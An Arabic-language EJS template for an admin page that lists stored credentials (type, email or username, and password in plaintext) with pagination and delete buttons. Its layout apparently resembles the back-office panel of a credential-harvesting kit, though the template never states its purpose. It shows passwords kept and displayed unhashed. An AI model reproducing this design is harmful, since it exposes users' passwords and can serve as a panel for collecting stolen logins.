<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= title %> - مدير قواعد البيانات</title>
    <link rel="stylesheet" href="/css/bootstrap.rtl.min.css">
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <%- include('../partials/admin_nav') %>

    <div class="container mt-4">
        <h1>إدارة البيانات</h1>

        <div class="card">
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-striped table-hover">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>النوع</th>
                                <th>القيمة (بريد/يوزر)</th>
                                <th>كلمة المرور</th>
                                <th>إجراء</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% if (credentials.length > 0) { %>
                                <% credentials.forEach(cred => { %>
                                    <tr>
                                        <td><%= cred.id %></td>
                                        <td><span class="badge bg-secondary"><%= cred.type %></span></td>
                                        <td><%= cred.value %></td>
                                        <td><%= cred.password %></td>
                                        <td>
                                            <form action="/admin/credentials/<%= cred.id %>/delete" method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف هذا السجل؟');">
                                                <button type="submit" class="btn btn-sm btn-danger">حذف</button>
                                            </form>
                                        </td>
                                    </tr>
                                <% }); %>
                            <% } else { %>
                                <tr>
                                    <td colspan="5" class="text-center">لا توجد بيانات لعرضها.</td>
                                </tr>
                            <% } %>
                        </tbody>
                    </table>
                </div>

                <% if (totalPages > 1) { %>
                    <nav aria-label="Page navigation">
                        <ul class="pagination justify-content-center">
                            <li class="page-item <%= currentPage === 1 ? 'disabled' : '' %>">
                                <a class="page-link" href="/admin/credentials?page=<%= currentPage - 1 %>">السابق</a>
                            </li>
                            <li class="page-item disabled">
                                <a class="page-link" href="#">صفحة <%= currentPage %> من <%= totalPages %></a>
                            </li>
                            <li class="page-item <%= currentPage === totalPages ? 'disabled' : '' %>">
                                <a class="page-link" href="/admin/credentials?page=<%= currentPage + 1 %>">التالي</a>
                            </li>
                        </ul>
                    </nav>
                <% } %>
            </div>
        </div>
    </div>

    <script src="/js/bootstrap.bundle.min.js"></script>
</body>
</html>
